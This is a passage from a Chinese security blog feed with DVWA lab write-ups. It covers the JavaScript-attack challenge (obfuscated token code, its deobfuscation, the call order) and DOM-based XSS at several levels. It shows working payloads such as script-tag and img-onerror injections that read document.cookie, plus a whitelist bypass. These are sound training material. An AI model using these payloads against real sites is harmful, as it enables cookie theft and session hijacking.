;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x)&#123;1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]&#125;A\x201e&#125;;N.Q.2U=N.Q.1e;N.Q.1G=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;uj a v a22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\x20t&#125;w\x202J(t,y=\x224B\x22)&#123;1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)&#125;w\x202B(e=\x224E\x22)&#123;1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)&#125;w\x202K(a,b)&#123;1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)&#125;1m.1o(\x222F\x22).1r=\x22\x22;4u(w()&#123;2B(\x224M\x22)&#125;,4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);&#x27;</span>,<span class="hljs-string">&#x27;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>];(<span class="hljs-keyword">function</span>(<span class="hljs-params">c,d</span>)&#123;<span class="hljs-keyword">var</span> e=<span class="hljs-keyword">function</span>(<span class="hljs-params">f</span>)&#123;<span class="hljs-keyword">while</span>(--f)&#123;c[<span class="hljs-string">&#x27;push&#x27;</span>](c[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="hljs-title function_">e</span>(++d);&#125;(a,<span class="hljs-number">0x1f4</span>));<span class="hljs-keyword">var</span> b=<span class="hljs-keyword">function</span>(<span class="hljs-params">c,d</span>)&#123;c=c-<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> e=a[c];<span class="hljs-keyword">return</span> e;&#125;;<span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">d,e,f,g,h,i</span>)&#123;h=<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<span class="hljs-keyword">return</span>(j&lt;e?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-title function_">h</span>(<span class="hljs-built_in">parseInt</span>(j/e)))+((j=j%e)&gt;<span class="hljs-number">0x23</span>?<span class="hljs-title class_">String</span>[<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>)](j+<span class="hljs-number">0x1d</span>):j[<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x24</span>));&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>)](<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(f--)&#123;i[<span class="hljs-title function_">h</span>(f)]=g[f]||<span class="hljs-title function_">h</span>(f);&#125;g=[<span class="hljs-keyword">function</span>(<span class="hljs-params">k</span>)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;wpA&#x27;</span>!==<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>))&#123;<span class="hljs-keyword">return</span> i[k];&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">while</span>(f--)&#123;i[<span class="hljs-title function_">k</span>(f)]=g[f]||<span class="hljs-title function_">k</span>(f);&#125;g=[<span class="hljs-keyword">function</span>(<span class="hljs-params">l</span>)&#123;<span class="hljs-keyword">return</span> i[l];&#125;];k=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>);&#125;;f=<span class="hljs-number">0x1</span>;&#125;&#125;];h=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>);&#125;;f=<span class="hljs-number">0x1</span>;&#125;;<span class="hljs-keyword">while</span>(f--)&#123;<span class="hljs-keyword">if</span>(g[f])&#123;<span class="hljs-keyword">if</span>(<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>)===<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>))&#123;<span class="hljs-keyword">return</span> i[h];&#125;<span class="hljs-keyword">else</span>&#123;d=d[<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>)](<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\x5cb&#x27;</span>+<span class="hljs-title function_">h</span>(f)+<span class="hljs-string">&#x27;\x5cb&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),g[f]);&#125;&#125;&#125;<span class="hljs-keyword">return</span> d;&#125;(<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>),<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x137</span>,<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>)[<span class="hljs-title function_">b</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>)](<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0x0</span>,&#123;&#125;));<br><br></code></pre></td></tr></table></figure><p>尝试进行js反混淆，得到反混淆的js。反混淆工具 <code>http://deobfuscatejavascript.com/#</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure><p>index.php中high级别源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;high&#x27;</span>:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$token</span> == <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-string">&quot;XX&quot;</span> . <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-string">&quot;success&quot;</span>)) . <span class="hljs-string">&quot;ZZ&quot;</span>)) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;p style=&#x27;color:red&#x27;&gt;Well done!&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="代码执行顺序"><a href="#代码执行顺序" class="headerlink" title="代码执行顺序"></a>代码执行顺序</h3><ol><li><p><code>setTimeout(function() &#123;token_part_2(&quot;XX&quot;)&#125;, 300);</code></p></li><li><p> <code>document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3)</code></p></li><li><p> <code>token_part_1(&quot;ABCD&quot;, 44)</code></p></li></ol><h3 id="由于setTimeout-延时执行函数和addEventListener-函数，函数实际执行顺序"><a href="#由于setTimeout-延时执行函数和addEventListener-函数，函数实际执行顺序" class="headerlink" title="由于setTimeout()延时执行函数和addEventListener()函数，函数实际执行顺序"></a>由于setTimeout()延时执行函数和addEventListener()函数，函数实际执行顺序</h3><ol><li><p> <code>token_part_1(&quot;ABCD&quot;, 44)</code></p></li><li><p><code>token_part_2(&quot;XX&quot;)</code></p></li><li><p><code>token_part_3()</code></p></li></ol><h4 id="所以我们最终的攻击顺序为"><a href="#所以我们最终的攻击顺序为" class="headerlink" title="所以我们最终的攻击顺序为"></a>所以我们最终的攻击顺序为</h4><ol><li><p>phrase输入框 <code>success</code></p></li><li><p><code>token_part_1(&quot;ABCD&quot;, 44)</code></p></li><li><p><code>token_part_2(&quot;XX&quot;)</code></p></li><li><p>点击submit按钮</p></li></ol><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="请求页面-1"><a href="#请求页面-1" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/07/dvwa-JS-attack/1692531590407.png" alt="1692531590407"></p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><br></code></pre></td></tr></table></figure><p>没看错吧，impossible级别不存在源码。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>据我观察，Javascript攻击本质上也是一种注入，发生在客户端浏览器。impossible? no impossible!<br><em><strong>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</strong></em></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS-JS-attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-XSS-DOM</title>
    <link href="/2022/06/06/dvwa-XSS-DOM/"/>
    <url>/2022/06/06/dvwa-XSS-DOM/</url>
    
    <content type="html"><![CDATA[<blockquote><p>DOM全称为Document Object Model即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构。<br>而DOM型的XSS是一种基于文档对象模型（DOM）的一种漏洞。这种XSS与反射型XSS、存储型XSS有着本质的区别，它的攻击代码不需要服务器解析响应，触发XSS依靠浏览器的DOM解析，客户端的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器获取数据并执行。</p></blockquote><blockquote><p>文档对象模型 (DOM) 将 web 页面与到脚本或编程语言连接起来。通常是指 JavaScript，但将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 语言的一部分。DOM 模型用一个逻辑树来表示一个文档，树的每个分支的终点都是一个节点 (node)，每个节点都包含着对象 (objects)。DOM 的方法 (methods) 让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。节点可以关联上事件处理器，一旦某一事件被触发了，那些事件处理器就会被执行。</p></blockquote><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/06/dvwa-XSS-DOM/1692472312469.png" alt="1692472312469"></p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/xss_d/?default=English</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/xss_d/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1ekmlj5hkmfpg44br6ilefo6s2; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p>和请求页面几乎一样，下拉选框中多了个之前点击的语言。</p><h2 id="low-php源码"><a href="#low-php源码" class="headerlink" title="low.php源码"></a>low.php源码</h2><p>low.php属于是放弃治疗了，直接不防了，空城计！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># No protections, anything goes</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="index-php源码"><a href="#index-php源码" class="headerlink" title="index.php源码"></a>index.php源码</h3><p>document 表示的是一个文档对象，Location 对象包含有关当前 URL 的信息，href 属性是一个可读可写的字符串，可设置或返回当前显示的文档的完整 URL。也就是说 “document.location.href” 的写法得到页面的 URL，而 indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置，这里用来判断 “default=” 是否在 URL 中。可以看到，<code>scirpt</code>标签中的代码document.write增加了表格下拉选项<code>lang</code>节点。关键部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (document.location.href.<span class="hljs-title function_ invoke__">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">var</span> lang = document.location.href.<span class="hljs-title function_ invoke__">substring</span>(document.location.href.<span class="hljs-title function_ invoke__">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>)+<span class="hljs-number">8</span>);<br>document.<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> + <span class="hljs-variable">$decodeURI</span>(lang) + <span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>);<br>document.<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ul><li>修改<code>default</code>。发送http请求<code>http://127.0.0.1/vulnerabilities/xss_d/?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li></ul><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>这次代码将<code>&lt;script</code>过滤了，当匹配到<code>&lt;script</code>字符串的时候就会将URL后面的参数修正为?Default=English,然后终止php运行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>既然只是过滤了<code>&lt;script</code>字符串，我们另辟蹊径，利用其他HTML标签。</p><ul><li>利用img标签。发送http请求<code>http://127.0.0.1/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;&quot; onerror=alert(document.cookie)&gt;</code><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2>服务器设置了白名单，default 参数只接受 French，English，German 以及 Spanish 这几个单词，不是这几个单词会默认为English。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>仅限制了<code>default</code>,使用参数连接符号<code>&amp;</code>尝试“无中生有”。</p><ul><li><code>/?default=English&amp;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li><li><code>?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;&quot; onerror=alert(document.cookie)&gt;</code></li></ul><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>放心交给客户端，大致意思是，而且<code>protect</code>，逼死强迫症。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Don&#x27;t need to do anything, protction handled on the client side</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS-DOM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-XSS-stored</title>
    <link href="/2022/06/06/dvwa-XSS-stored/"/>
    <url>/2022/06/06/dvwa-XSS-stored/</url>
    
